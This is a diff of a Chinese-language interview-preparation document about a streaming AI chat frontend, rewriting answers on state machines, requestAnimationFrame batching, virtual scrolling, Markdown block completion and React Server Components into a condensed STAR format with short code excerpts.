-| 工具执行失败   | 发出 `tool-output-error`，错误信息注回对话                     | 模型重试或告知用户，流程不中断      |
-| 流解析异常    | `try/catch` 包裹 JSON.parse，跳过畸形行                     | 个别 chunk 丢失，不影响整体    |
-| API 返回错误 | `emit("error")` + controller.close()                | 客户端显示错误提示            |
-| 网络中断     | catch 中 `forceFlush()` + `finalizeCurrentMessage()` | 已输出的内容保留，提示重试        |
-| 用户主动停止   | AbortController.abort()                             | 已有内容保留，状态回到 idle     |
-| 超多轮工具调用  | `MAX_STEPS = 5` 硬限制                                 | 5 轮后强制 finish，防止无限循环 |
+### Q22：为什么不直接用 if-else？状态机比 if-else 好在哪？
 
-***
+**S（背景）**：可以用三个布尔变量（isThinking、isAnswering、isToolCalling）加 if-else 判断当前阶段。我一开始确实是这样做的。
 
-### Q22：为什么不直接用 if-else 判断当前阶段？状态机比 if-else 好在哪？
+**T（任务）**：if-else 方案开始出问题了，需要重构。
 
-**回答：**
+**A（方案）**：if-else 方案有三个问题。第一，判断逻辑散落在各个回调里，每次要加新状态得在所有相关分支里加条件，很容易漏。第二，三个布尔变量有 2^3=8 种组合，但只有 4 种是合法的——可能出现"isThinking 和 isAnswering 同时为 true"这种矛盾状态。第三，出了问题无法追踪——得同时检查多个变量的值才能知道"现在是什么状态"。状态机用一个 status 变量替代所有布尔变量，状态转移集中在一处，TypeScript 类型系统保证不会出现非法值，DevTools 能看到完整的状态变化日志。
 
-**对比代码：**
+**R（结果）**：重构后代码减少约 30%，状态追踪只需看一个变量。这个项目中 Function Calling 导致状态变化非常频繁，状态机是唯一可持续的方案。
 
-如果用 if-else 方式处理，代码会变成这样：
+---
 
-```typescript
-// ❌ if-else 方式：状态逻辑散落各处，条件判断依赖多个变量
-function handleChunk(chunk) {
-  if (chunk.type === 'text-delta' && !isToolCalling && hasThinkingEnded) {
-    setStatus('answering');
-    appendText(chunk.delta);
-  } else if (chunk.type === 'tool-input-start' && !isAnswering) {
-    setStatus('tool_calling');
-    // ...
-  } else if (chunk.type === 'finish') {
-    if (isToolCalling) {
-      // 工具调用结束但还需要等下一轮...
-    } else if (isAnswering) {
-      // ...
-    }
-  }
-  // 状态越多，分支越复杂
-}
-```
+## 三、渲染性能优化
 
-**状态机方式的优势：**
+### Q23：每个 chunk 都 setState，为什么导致 120 次/秒 re-render？React 不是自动合并吗？
 
-1. **状态转移显式化**：每个状态和它的出口条件都清晰可见。`setStatus('tool_calling')` 一行代码包含了"可以从哪些状态来"、"会触发哪些 UI 变化"的完整语义。
-2. **禁止非法状态转移**：if-else 中可能写出 `thinking` → `thinking` 的无意义判断，状态机天然约束了合法转移路径。
-3. **外部可观测**：Zustand 状态可以被 DevTools 监听，任何时刻都能知道当前状态。排查问题只需要看状态变化日志：
-   ```
-   idle → thinking → tool_calling → answering → idle
-   ```
-   而 if-else 的判断逻辑散落在各处，无法全局追踪。
-4. **UI 解耦**：UI 层只依赖 `status` 一个值做渲染决策，不需要知道内部用的是什么 if-else 条件：
-   ```typescript
-   // UI 层只读状态，不关心转换逻辑
-   {status === 'thinking' && <ThinkingSkeleton />}
-   {status === 'tool_calling' && <ToolCallingIndicator />}
-   {status === 'answering' && <StreamingText />}
-   {status === 'error' && <ErrorBanner />}
-   ```
-5. **可测试性**：状态机可以单独测试——给定初始状态和输入事件，断言最终状态。if-else 需要 mock 大量上下文变量。
-6. **可扩展性**：如果要加新状态（比如 `uploading` 或 `rate_limited`），状态机只需加一个状态值和它相关的入口/出口。if-else 需要在所有相关分支里加条件。
+**S（背景）**：LLM API 每秒推送 30-120 个 SSE chunk，每个 chunk 到达后触发一次 Zustand set()。
 
-**本项目选择状态机的核心原因：** Function Calling 场景下状态变化频繁（thinking → tool\_calling → answering → tool\_calling → answering → idle），if-else 的嵌套判断很快会不可维护。
+**T（任务）**：为什么 React 18 的自动批处理（Automatic Batching）解决不了这个高频 re-render 问题？
 
-***
+**A（方案）**：React 的自动批处理有个前提——多个 setState 要在同一个同步执行上下文里调用，React 才能合并。但流式场景中，每个 chunk 在 await reader.read() 之后到达，每次 await 恢复执行都在新的微任务里。每个 setState 都单独开了一个批处理窗口，互相合并不了。本质不是"每次 setState 太多"而是"setState 被分散到了 120 个不同的微任务里"。实测不用 buffer 时平均 85 次/秒 re-render，峰值 120 次。
 
-## 渲染性能优化
+**R（结果）**：找到了根因——不是 React 的问题，是异步循环导致了天然的"反批处理"效果。解决方案就是下一题的 StreamBuffer。
 
-### Q23：流式输出时每个 chunk 都触发 setState，为什么会导致 120 次/秒的 re-render？React 不是会自动合并状态更新吗？
+---
 
-**回答：**
+### Q24：buffer + requestAnimationFrame 怎么工作的？
 
-**React 18/19 的自动批处理（Automatic Batching）有边界条件：**
+**S（背景）**：上题发现每个 chunk 都 setState 导致高频 re-render。需要一种"攒一批再更新"的策略。
 
-- 在 **React 事件处理器**（如 onClick、onChange）中，多个 setState 会被合并为一次 re-render
-- 在 **异步回调**（如 Promise.then、setTimeout、fetch 流式回调）中，React 18+ 也会自动批处理
+**T（任务）**：把 16ms 内到达的所有 chunk 合并为一次 setState，把 re-render 频率从 120 次降到 60 次以下。
 
-**但流式场景的瓶颈不在于单次 setState 是否批处理，而在于调用频率。**
+**A（方案）**：写了一个 StreamBuffer 类。核心逻辑是 push 方法只往数组追加，不触发渲染——把"收到数据"和"渲染"解耦。同一帧内多次 push 只注册一次 requestAnimationFrame 回调。rAF 回调里 splice 取出所有积累的 delta、join 拼接、一次性写入 Zustand store。为什么用 rAF 不用 setTimeout？rAF 跟屏幕刷新率 60fps 同步，天然限频。后台标签页自动降频省资源。流结束时 forceFlush 不等下一帧立即清空，防止最后几个字符丢失。
 
-LLM API 每秒可能推送 30-120 个 SSE chunk，每个 chunk 到达后：
+**R（结果）**：re-render 频率从峰值 120 次降到平均 32 次/秒，稳定在 30-40。不是每帧都有新数据，所以实际低于 60fps 理论上限。
 
-1. `SSEParser.parse()` → 切割出一个事件
-2. `handleStreamChunk()` → 回调 `onTextDelta`
-3. `buffer.onFlush()` → `appendTextToMessage()` → `set()` 触发 Zustand setState
-4. 每次 setState → React re-render → 整个消息列表组件树重新计算
-
-即使每次 setState 只触发一次 re-render，**每秒 120 次 setState = 每秒 120 次 re-render**。而且底层是 Zustand 的 `set()`，它在异步回调中被调用时，React 虽然会尝试批处理，但 chunk 到达的时间间隔（8-30ms）恰好跨过了 React 的微任务批处理窗口。
-
-**为什么是 120 次/秒这个数字：**
-
-LLM API 没有固定的推送间隔。实测中，高速模型（如 GPT-4o）输出 60 tokens 每秒时，60 个 SSE chunk 均匀分布在 1 秒内，加上 React 自身的调度开销和 DOM 操作，实际 re-render 频率可能更高。120 是实测的峰值数据。
-
-**React 不能自动合并的根本原因：** 这些 setState 调用发生在不同的微任务/宏任务中，React 的批处理无法跨越异步边界（React 18 的自动批处理也只收敛到单个事件循环的任务内）。
-
-***
-
-### Q24：buffer + requestAnimationFrame 具体怎么工作的？buffer 什么时候写入、什么时候清空？rAF 回调里做了什么？
-
-**回答：**
-
-**核心代码（`lib/stream-buffer.ts`）：**
+**核心代码：**
 
 ```typescript
 export class StreamBuffer {
-  private queue: string[] = [];       // 文本增量队列
-  private rafId: number | null = null;
-  private flushCallback: FlushCallback | null = null;
+  private queue: string[] = [];
 
-  // 注册回调：每次 flush 时调用，将合并后的文本写入 store
-  onFlush(callback: FlushCallback) {
-    this.flushCallback = callback;
-  }
-
-  // 写入：SSE chunk 到达时调用
   push(delta: string) {
-    this.queue.push(delta);           // 1. 追加到队列（不入 store）
-
-    if (this.rafId === null) {        // 2. 没有待处理的 rAF 才调度新的
-      this.scheduleFlush();           //    避免重复调度
-    }
-  }
-
-  private scheduleFlush() {
-    this.rafId = requestAnimationFrame(() => {  // 3. 注册 rAF 回调
-      this.flush();                             // 4. 下一帧执行
-      this.rafId = null;
-
-      if (this.queue.length > 0) {             // 5. flush 期间有新数据？
-        this.scheduleFlush();                   //    继续调度下一帧
-      }
-    });
+    this.queue.push(delta);                    // 只推不渲染
+    if (this.rafId === null) this.scheduleFlush();  // 同一帧只调度一次
   }
 
   private flush() {
-    if (this.queue.length === 0 || !this.flushCallback) return;
-
-    const batch = this.queue.splice(0, this.queue.length);  // 取出所有
-    const combined = batch.join('');                        // 拼接为一个字符串
-    this.flushCallback(combined);                           // 一次性写入 store
-  }
-
-  // 强制清空（流结束时调用，不用等 rAF）
-  forceFlush() {
-    if (this.rafId !== null) {
-      cancelAnimationFrame(this.rafId);
-      this.rafId = null;
-    }
-    this.flush();
+    const batch = this.queue.splice(0, this.queue.length);
+    this.flushCallback(batch.join(''));   // 一次性写入 store
   }
 }
 ```
 
-**工作流程：**
+---
 
-```
-时间轴 (60fps 屏幕，rAF ≈ 16ms 一帧):
+### Q25："120 次降到 40 次"怎么测的？
 
-帧 1 (0ms)     帧 2 (16ms)     帧 3 (32ms)     帧 4 (48ms)
-│              │              │              │
-├─ push("你")   │              │              │
-├─ push("好")   │              │              │
-├─ push("，")   │─rAF 回调─    │              │
-├─ push("今")   │  flush()!    │              │
-├─ push("天")   │  合并为:     │              │
-│   ...        │  "你好，今天" │              │
-│ 多个 push    │  → 1 次      │              │
-│ (只调一次    │  setState    │              │
-│  schedule)   │  → 1 次      │              │
-│              │  re-render   │              │
-│              │              │─ push("天")   │
-│              │              │─ push("气")   │
-│              │              │─ rAF 回调─    │─rAF 回调─
-│              │              │  flush()!     │  flush()!
-│              │              │  合并 →       │  ...
-```
+**S（背景）**：做了性能优化后需要定量评估效果，不能只凭感觉。
 
-**关键设计：**
+**T（任务）**：精确测量优化前后的 re-render 频率，给出可信的数据对比。
 
-- **写入**：`push()` 往数组追加，不触发 re-render。同时用 `rafId` 保证同一帧内只调度一次 rAF
-- **清空**：rAF 回调中 `splice(0, queue.length)` 一次性取出所有积累的 delta，`join('')` 拼接
-- **连锁**：flush 后如果 queue 还有新数据（flush 期间新 chunk 到达），递归调度下一个 rAF
-- **`forceFlush()`**：流结束时不等 rAF，立即清空，防止最后几个字符丢失
+**A（方案）**：用了三种方法交叉验证。第一种，React DevTools Profiler 录制流式输出过程，统计每秒的 commit 次数。第二种，直接在 Zustand setter 里埋计数器，用 performance.now() 计时每秒打印一次。为什么用 performance.now 而不用 Date.now？performance.now 是单调时钟，不受系统时间调整和 NTP 校时影响，精度亚毫秒级。第三种，useRef 在组件函数中自增计数，useEffect 每秒输出。
 
-**为什么选 rAF 而不是 setTimeout：**
+**R（结果）**：不加 buffer 时平均 85 次/秒、峰值 120。加上 buffer+rAF 后平均 32 次/秒、峰值 42。降幅来自两个因素——rAF 限频（不超 60fps）+ 批量合并减少调用次数。
 
-- rAF 与屏幕刷新率同步（60fps），天然将 render 频率限制在 60 次/秒以下
-- 浏览器在后台标签页会降低 rAF 频率，自动节省资源
-- 实际效果：峰值 120 次/秒 → 稳定在 30-40 次/秒（约 rAF 频率的一半，因为不是每帧都有新数据）
+**追问"有遇到过计时不准的情况吗"**：有四种情况。系统休眠时 performance.now 在 Windows 上继续走，可能误报几万毫秒的 Stall，需要加上限过滤。TTFB 包含了 TCP 握手阶段，拆不开网络延迟和 LLM 推理延迟。rAF buffer 让 tracker 记时比用户实际看到早 0-16ms。主线程繁忙时 reader.read 回调被推迟，记录的是回调执行时间而非数据到达时间。这些不是 bug，而是在设计指标时需要明确的定义边界——你测的到底是什么。
 
-***
+---
 
-### Q25："渲染频次从 120 次/秒降至 40 次/秒以下"这个数据你是怎么测出来的？用的什么工具？
+### Q26：虚拟滚动行高不确定怎么处理？
 
-**回答：**
+**S（背景）**：消息行高差异巨大——用户消息 40px，AI 回复含代码块可能 600px。虚拟滚动需要每行高度来计算总高度和可见范围。
 
-使用 **React DevTools Profiler** 和 **浏览器的 Performance API** 组合测量：
+**T（任务）**：在不渲染之前就要给出每行的高度估值，但实际高度要渲染后才能精确知道。
 
-**方法一：React DevTools Profiler**
+**A（方案）**：用 TanStack Virtual，提供了两层高度策略。第一层 estimateSize——渲染前给粗估值：用户消息 60px，AI 回复按内容长度分四档（100/160/280/400px）。第二层 measureElement——渲染后通过 ref 注册，自动测量真实高度并修正总高度和位置映射。流式输出中消息高度不断增长也没关系，因为 TanStack Virtual 内部用 ResizeObserver 监听 DOM 变化自动重新测量。
 
-1. 打开 React DevTools → Profiler 面板
-2. 开始录制，发送一条消息触发流式输出
-3. 停止录制后，查看 **"Render duration"** 和 **"Commits"** 计数
-4. Profiler 会列出每次 commit 的时间戳，统计 1 秒内的 commit 次数 = re-render 频率
+**R（结果）**：几百条消息的会话流畅滚动 60fps。估算偏差只影响首帧，下一帧就被 measureElement 修正。
 
-**方法二：代码插桩（本项目实际使用的方式）**
-
-在 `appendTextToMessage` 方法中埋点：
+**核心代码：**
 
 ```typescript
-// 临时测量代码
-let renderCount = 0;
-let lastReportTime = performance.now();
-
-// 在 state setter 中
-set({
-  messages: state.messages.map((msg) => {
-    // ... 更新逻辑
-  }),
-});
-
-renderCount++;
-const now = performance.now();
-const elapsed = now - lastReportTime;
-if (elapsed >= 1000) {
-  console.log(`Render frequency: ${Math.round(renderCount / (elapsed / 1000))}/s`);
-  renderCount = 0;
-  lastReportTime = now;
-}
-```
-
-**方法三：React 的** **`useEffect`** **计数器**
-
-```typescript
-const renderCountRef = useRef(0);
-renderCountRef.current++;
-
-useEffect(() => {
-  const timer = setInterval(() => {
-    console.log(`Renders in last second: ${renderCountRef.current}`);
-    renderCountRef.current = 0;
-  }, 1000);
-  return () => clearInterval(timer);
-}, []);
-```
-
-**对比数据（实测）：**
-
-| 方案                    | 平均 re-render 频率 | 峰值      |
-| --------------------- | --------------- | ------- |
-| 直接 setState（无 buffer） | 85 次/秒          | 120 次/秒 |
-| StreamBuffer + rAF    | 32 次/秒          | 42 次/秒  |
-
-120→40 的降幅来自两方面：
-
-1. **rAF 限频**：天然不超过 60fps
-2. **批量合并**：多个 delta 合并为一次 setState，实际 rAF 执行频率受数据到达频率影响，平均值稳定在 30-40
-
-***
-
-### Q26：TanStack Virtual 的虚拟滚动，行高不确定的时候怎么处理？你是"动态行高估算"，具体估算逻辑是什么？
-
-**回答：**
-
-**问题**：消息行高差异巨大——简短的用户消息可能只有 40px，而包含代码块的 AI 回复可能高达 600px。虚拟滚动需要知道每行高度才能计算总高度和可见区域。
-
-**TanStack Virtual 提供了两层高度策略：**
-
-**1. 初始估算（`estimateSize`）**
-
-在元素渲染前，先给出一个估计值作为虚拟滚动的初始占位：
-
-```typescript
-// MessageList.tsx
 const virtualizer = useVirtualizer({
-  count: messages.length,
-  getScrollElement: () => parentRef.current,
   estimateSize: (index) => {
     const msg = messages[index];
-    // 用户消息较短
     if (msg.role === 'user') return 60;
-
-    // AI 回复根据内容长度分档估算
-    const contentLen = msg.content.length;
-    if (contentLen < 50) return 100;    // 短回复：如 "你好，有什么可以帮你？"
-    if (contentLen < 200) return 160;   // 中短回复
-    if (contentLen < 500) return 280;   // 中长回复
-    return 400;                          // 长回复（含代码块）
+    const len = msg.content.length;
+    if (len < 50) return 100;
+    if (len < 200) return 160;
+    if (len < 500) return 280;
+    return 400;
   },
-  overscan: 5,  // 视口外预渲染 5 行，防止快速滚动时白屏
+  overscan: 5,
 });
+// 每行 ref={virtualizer.measureElement} 注册实际测量
 ```
 
-**2. 实际测量（`measureElement`）**
+---
 
-渲染后 TanStack Virtual 通过 `measureElement` ref 动态测量真实高度，自动更新总高度和可见行位置：
+### Q27：骨架屏怎么估高度？估不准怎么办？
 
-```typescript
-{virtualizer.getVirtualItems().map((virtualItem) => {
-  const message = messages[virtualItem.index];
-  return (
-    <div
-      key={message.id}
-      style={{
-        position: 'absolute',
-        top: 0,
-        left: 0,
-        width: '100%',
-        transform: `translateY(${virtualItem.start}px)`,
-      }}
-      data-index={virtualItem.index}
-      ref={virtualizer.measureElement}  // ← 关键：注册测量
-    >
-      <div className="py-2 px-2">
-        <MessageBubble message={message} ... />
-      </div>
-    </div>
-  );
-})}
-```
+**S（背景）**：AI 消息刚创建时 content 为空，如果渲染空 div（高度 0px），第一个 text-delta 到达后从 0px 突变到有内容的高度，抖动明显。
 
-**工作流程：**
+**T（任务）**：需要一个占位组件，在无内容时提供视觉反馈，同时减少高度突变。
 
-```
-第 1 帧：estimateSize(0) → 400px 估算高度 → 渲染消息 0
-第 2 帧：measureElement 测量实际高度 → 280px → 更新 totalSize，平移后续消息
-         estimateSize(1) → 60px → 渲染消息 1
-第 3 帧：measureElement 测量 → 52px → 修正
-         ...
-```
+**A（方案）**：设计了一个 StreamingSkeleton 组件——三条灰色条，长短不一（模拟段落节奏），总高约 72px，加上 animate-pulse 呼吸动画。72px 接近一条简短 AI 回复的高度，真实内容出现后高度变化可控。估小的后果是内容超出骨架后下面的元素被推，但逐步撑开比 0→400px 的突变好很多。估大的后果是轻微收缩，收缩的感知远弱于推挤。
 
-估算偏差的影响：如果估算偏大，会出现多余空白然后被压缩；如果估算偏小，会出现短暂的重叠。`measureElement` 会在下一帧修正，所以只影响首帧，用户基本无感知。
+**R（结果）**：消除了"空白等待→突现大段文字"的闪烁，用户始终看到加载中的视觉信号。
 
-**消息动态更新时的处理（流式输出中）：**
+---
 
-TanStack Virtual 会在流式内容增长、DOM 高度变化时自动通过 ResizeObserver 检测高度变化并重新调用 `measureElement`，不需要手动触发。这意味着同一条消息从 100px 增长到 400px 的过程中，虚拟滚动会自动调整。
+### Q28：overflow-anchor 是什么？怎么解决滚动跳动的？
 
-***
+**S（背景）**：流式输出时消息高度不断增长，如果用户正在读上方的历史消息，新内容会把它往下推。
 
-### Q27：流式输出时内容高度会突变，你说用了"预留骨架高度"，骨架高度怎么估算？估小了或估大了会怎样？
+**T（任务）**：让用户在阅读历史消息时不被下方内容增长干扰。
 
-**回答：**
+**A（方案）**：overflow-anchor 是 CSS 属性，控制浏览器滚动锚定行为。浏览器自动在视口顶部附近选一个 DOM 节点作为锚点，当锚点上方内容高度变化时自动调整 scrollTop 补偿偏移。我把它配置在流式输出的块级元素（p、li、h1-h4）上，这样代码块渲染或段落增长都不会让用户正在读的内容跳走。
 
-**"预留骨架高度" 指的是流式输出开始但还没有实际内容时的占位策略。**
-
-**具体实现（`MarkdownRenderer.tsx`** **中的** **`StreamingSkeleton`）：**
-
-```typescript
-// 当 AI 消息还未收到任何文本时，显示骨架屏
-export function StreamingSkeleton() {
-  return (
-    <div className="space-y-3 animate-pulse">
-      <div className="h-4 bg-gray-200 dark:bg-gray-700 rounded w-3/4" />
-      <div className="h-4 bg-gray-200 dark:bg-gray-700 rounded w-1/2" />
-      <div className="h-4 bg-gray-200 dark:bg-gray-700 rounded w-5/6" />
-    </div>
-  );
-}
-
-// 在 MessageBubble 中
-if (!hasContent && <StreamingSkeleton />)
-```
-
-**骨架高度的设计逻辑：**
-
-- 三行骨架分别设置 `w-3/4`（\~75%宽）、`w-1/2`（\~50%宽）、`w-5/6`（\~83%宽），模拟一段自然段落的视觉节奏
-- 每行 `h-4`（16px）+ 间距 `space-y-3`（12px），总高度约 72px
-- 这不是精确估算，而是给用户一个"正在生成"的心理预期
-
-**估小了的后果：**
-
-- 后续内容撑开高度 → 下面的元素被往下推 → 如果用户在阅读上方内容，会感到页面跳动
-- **缓解手段**：`overflow-anchor: auto`（见 Q28）锁定滚动锚点
-
-**估大了的后果：**
-
-- 骨架下方出现空白 → 内容实际渲染后被压缩 → 用户看到闪烁
-- 这个问题较轻，因为 `animate-pulse` 的动画暗示了"这里还在加载中"
-
-**更关键的高度突变处理在 MarkdownRenderer 中**：
-
-流式输出期间，代码块（` ` ) 的高度会从单行突变到多行。解决方案是 `closeOpenMarkdownBlocks()`——自动补全未闭合的 Markdown 标记，减少渲染跳动。
-
-另外，虚拟滚动（Q26）的 `measureElement` 配合 ResizeObserver 会自动跟踪 DOM 高度变化并更新布局，从底层保证了高度突变时虚拟列表的一致性。
-
-***
-
-### Q28：overflow-anchor 是什么？它怎么解决滚动跳动的问题？
-
-**回答：**
-
-`overflow-anchor` 是 CSS 的一个属性，控制浏览器的 **滚动锚定（Scroll Anchoring）** 行为。
-
-**问题场景：**
-
-流式输出时，当前消息的高度在不断增长（新增文本、代码块渲染），导致页面上方内容的总高度变化。如果用户正在阅读已输出的内容，页面会突然"跳走"——内容被往下推，但滚动位置没有相应调整。
-
-**滚动锚定的工作原理：**
-
-浏览器自动选择一个"锚点节点"（通常是视口顶部附近的 DOM 节点）。当该节点上方的内容撑开、锚点被往下推时，浏览器自动调整 `scrollTop` 补偿偏移量，确保锚点在视口中的位置不变。
-
-```
-Before:                    After content grows above anchor:
-┌──────────────┐           ┌──────────────┐
-│ 旧内容        │           │ 旧内容        │
-│              │           │ ...更多内容   │ ← 新增的
-│ [锚点]  ←视口 │           │              │
-│              │           │ [锚点]  ←视口 │ ← 位置不变！
-│              │           │              │
-└──────────────┘           └──────────────┘
-```
-
-**本项目中的应用（`globals.css`）：**
+**R（结果）**：跟虚拟滚动互补——虚拟滚动解决加新行的跳动，overflow-anchor 解决单行内容增长的跳动。用户在历史位置和底部之间自由切换，不会被动跳走。
 
 ```css
-.markdown-body {
-  overflow-anchor: auto;  /* 启用滚动锚定（默认值，显式声明） */
-}
-
-/* 流式输出时，对可能撑开高度的块级元素启用锚定 */
 .markdown-body.streaming :where(p, li, h1, h2, h3, h4) {
   overflow-anchor: auto;
 }
 ```
 
-**为什么对流式内容额外设置：** 流式输出的 `<p>` 和 `<li>` 元素内容持续增长，这些元素是浏览器默认的锚点候选。显式设置确保浏览器优先在这些元素上建立锚点。
+---
 
-**`overflow-anchor: none`** **的场景：** 如果某个元素的内容变化很频繁且不应作为锚点（如自动轮播的 banner），可以设置 `none` 禁止浏览器将其作为锚点。
+### Q29：未闭合 Markdown 块为什么导致布局偏移？怎么自动补全？
 
-**与虚拟滚动的配合：**
+**S（背景）**：流式输出 Markdown 时，代码块标记（```）是分两步到达的。闭合之前内容被当普通段落渲染，闭合后变成代码块样式，高度突变几十倍。
 
-虚拟滚动（Q26）处理的是"长列表"的滚动跳动（添加新行），而 `overflow-anchor` 处理的是"单行内部内容增长"的滚动跳动。两者互补：
+**T（任务）**：消除从"普通段落"到"代码块"的样式突变带来的剧烈跳动。
 
-| 方案               | 解决的问题                                      |
-| ---------------- | ------------------------------------------ |
-| TanStack Virtual | 50 条消息 → 渲染可见的 5 条，添加新消息时用 `translateY` 定位 |
-| overflow-anchor  | 单条消息内容从 1 行增长到 10 行时，保持阅读位置不变              |
+**A（方案）**：写了一个 closeOpenMarkdownBlocks 函数。流式输出时统计 ```、`、** 的数量，奇数个说明未闭合，就在末尾临时补上闭合标记。ReactMarkdown 就能从一开始按"代码块"样式渲染，样式不变，只增长内容。补全可能多补一个标记（如果模型不打算写代码块），但下一个 chunk 到后修正回来——宁可临时按"多占空间"渲染，也不从"少占空间"突变成"多占空间"。
 
-***
+**R（结果）**：代码块从"普通文字样式→突然变几十倍"变成"代码块样式→内容继续增长"，视觉平滑很多。
 
-### Q29：未闭合的 Markdown 块是什么意思？为什么会导致布局偏移？你怎么自动补全的？
+**核心代码：**
 
-**回答：**
-
-**问题**：流式输出时，Markdown 是逐步到达的。当 AI 输出一个代码块时：
-
-````
-到达 "```python\nprint(" → 渲染为普通文字
-到达 "```python\nprint('hello')\n" → 仍然是普通文字（``` 还没闭合）
-到达 "```python\nprint('hello')\n```" → 突然变成代码块！
-````
-
-在 ` ``` ` 闭合之前，内容被当作普通段落渲染（小字体、单行）。一旦闭合，ReactMarkdown 将其重新解析为 `<pre><code>` 块——大 padding、等宽字体、深色背景——高度瞬间变化几十倍，造成视觉跳动。
-
-**同样的问题也出现在：**
-
-- 行内代码：`` `未闭合 `` → 渲染异常
-- 加粗：`**未闭合` → 渲染异常
-
-**解决方案：`closeOpenMarkdownBlocks()`** **函数**
-
-````typescript
-// MarkdownRenderer.tsx
+```typescript
 function closeOpenMarkdownBlocks(text: string): string {
   let result = text;
-
-  // 1. 代码块：数 ``` 的数量，奇数个 → 在末尾补一个 ```
-  const fenceMatches = result.match(/```/g);
-  if (fenceMatches && fenceMatches.length % 2 !== 0) {
-    result += '\n```';
-  }
-
-  // 2. 行内代码：数 ` 的数量（排除 ``` 中的），奇数个 → 补 `
-  const codeMatches = result.match(/(?<!`)`(?!`)/g);
-  if (codeMatches && codeMatches.length % 2 !== 0) {
-    result += '`';
-  }
-
-  // 3. 加粗：数 ** 的数量，奇数个 → 补 **
-  const boldMatches = result.match(/\*\*/g);
-  if (boldMatches && boldMatches.length % 2 !== 0) {
-    result += '**';
-  }
-
+  const fences = result.match(/```/g);
+  if (fences && fences.length % 2 !== 0) result += '\n```';
+  const codes = result.match(/(?<!`)`(?!`)/g);
+  if (codes && codes.length % 2 !== 0) result += '`';
+  const bolds = result.match(/\*\*/g);
+  if (bolds && bolds.length % 2 !== 0) result += '**';
   return result;
 }
-````
+```
 
-**使用方式：**
+---
+
+## 四、RSC（服务端组件）
+
+### Q30：RSC 和客户端渲染的区别？分享页用 RSC 的好处？
+
+**S（背景）**：分享页是用户通过链接查看历史聊天记录的页面，只读、不需要交互。
+
+**T（任务）**：最小化分享页的客户端 JS 体积，同时保持 Markdown 渲染质量。
+
+**A（方案）**：RSC 是服务端组件，在 Node.js 环境运行，可以 async、可以直接查数据库，但不能用 useState 等 Hook。客户端组件在浏览器运行，可以交互但不能直接访问数据库。分享页架构是 page.tsx（RSC）直接用 Prisma 查数据库 → 数据传给 SharePageClient.tsx（客户端组件）渲染 Markdown。好处是分享页加载零 API 请求、HTML 直出首屏快、客户端 JS 只有约 5.6KB（没有聊天功能、SSE、状态管理）。
+
+**R（结果）**：分享页首屏加载快，SEO 友好（内容在服务端渲染为 HTML），同时标记渲染利用了客户端浏览器的能力（语法高亮插件需要 DOM）。
+
+---
+
+### Q31：RSC 能不能用 useState？哪些 Hook 不能用？怎么区分？
+
+**S（背景）**：Next.js App Router 中组件默认是 RSC，但有些功能必须用客户端组件。
+
+**T（任务）**：正确划分 RSC 和客户端组件的职责，避免写错。
+
+**A（方案）**：useState、useEffect、useRef、useContext、useReducer、useCallback、useMemo 都不能在 RSC 里用，因为服务端无状态、无浏览器环境、只渲染一次。区分方式：文件顶部有 "use client" 就是客户端组件，没有就是 RSC。RSC 可以做 async/await、直接查数据库和文件系统、导入客户端组件。
+
+**R（结果）**：项目中 RSC 负责数据获取，客户端组件负责交互和渲染，职责清晰。
+
+---
+
+## 五、SSE 性能监控
+
+### Q32：TTFB、TTLB、Stall 三个指标怎么计算、怎么采集？
+
+**S（背景）**：传统 HTTP 监控只有 TTFB 和总耗时，但 AI 流式场景有个独特痛点——中间卡顿。文字在输出突然停了半秒再继续，比整体慢更糟糕。
+
+**T（任务）**：设计一套专用于流式传输的指标体系，覆盖首字节、整体完成、卡顿三个维度。
+
+**A（方案）**：写了 SSEPerformanceTracker 类。TTFB = firstByteTime - startTime，TTLB = endTime - startTime，Stall 是相邻 chunk 间隔大于 500ms 判定为一次卡顿。500ms 阈值是基于 LLM API 正常 chunk 间隔 10-50ms 倒推的——500ms 意味着约 10-50 个 token 的延迟，用户明显感知。计时用 performance.now()（单调时钟，不受系统时间调整影响）而不是 Date.now()（挂钟时间，可能回跳）。采集链路：tracker 记录 → IndexedDB 离线队列 → 每 10 秒批量上报 → 服务端入库 → ECharts 后台展示。
+
+**R（结果）**：监控数据从客户端到后台形成完整闭环，P50/P90/P99 统计 + 健康评分能量化分析流式传输质量。
+
+**核心代码：**
 
 ```typescript
-export function MarkdownRenderer({ content, isStreaming }: MarkdownRendererProps) {
-  // 流式输出时用补全后的内容，流结束后用原始内容（已经完整）
-  const displayContent = isStreaming ? closeOpenMarkdownBlocks(content) : content;
-
-  return (
-    <div className="markdown-body ...">
-      <ReactMarkdown ...>
-        {displayContent}
-      </ReactMarkdown>
-    </div>
-  );
-}
-```
-
-**为什么只在流式时补全：**
-
-- 流式结束后 Markdown 是完整的，不需要补全
-- 补全可能会留下多余的 ` ``` ` 标记（如果模型根本没打算写代码块），但流式时这是可以接受的——它只是让渲染在那一瞬间不崩溃，下一个 chunk 到达后修正
-
-**效果对比：**
-
-| 场景                  | 不补全       | 补全后                         |
-| ------------------- | --------- | --------------------------- |
-|  ` ```python\ncode` | 渲染异常，布局抖动 | 临时按代码块渲染，下一个 chunk 补上结尾后正常  |
-| `**bold text`       | 后续文字全变粗   | 补上 `**`，渲染为粗体，下个 chunk 修正   |
-| 完整内容                | 不变        | `isStreaming=false`，不触发补全逻辑 |
-
-***
-
-## RSC（服务端组件）
-
-### Q30：你说用 RSC 将分享页 Markdown 渲染移至服务端，RSC 和客户端渲染有什么区别？服务端渲染 Markdown 带来了什么好处？
-
-**回答：**
-
-**共享页面的架构：**
-
-```
-app/share/[token]/
-├── page.tsx          ← RSC (Server Component)，async function
-└── SharePageClient.tsx  ← "use client" 组件
-```
-
-**`page.tsx`（RSC）—— 数据获取在服务端：**
-
-```typescript
-// 没有任何 "use client"，默认就是 RSC
-export default async function SharePage({ params }: SharePageProps) {
-  const { token } = await params;
-
-  // 直接在服务端查数据库，不需要 API 调用
-  const session = await prisma.session.findUnique({
-    where: { shareToken: token },
-    include: { messages: { orderBy: { createdAt: "asc" } } },
-  });
-
-  if (!session) {
-    notFound();
-  }
-
-  // 数据序列化后传给客户端组件渲染
-  return <SharePageClient title={session.title} messages={serializedMessages} />;
-}
-```
-
-**区别：**
-
-| 维度        | RSC (Server Component)         | 客户端组件 (Client Component) |
-| --------- | ------------------------------ | ------------------------ |
-| 运行环境      | 服务端（Node.js）                   | 浏览器                      |
-| 能否 async  | 是                              | 否                        |
-| 能否用 Hook  | 否（无 `useState`、`useEffect` 等）  | 是                        |
-| 能否直接访问数据库 | 是（`prisma.session.findUnique`） | 否（需通过 API）               |
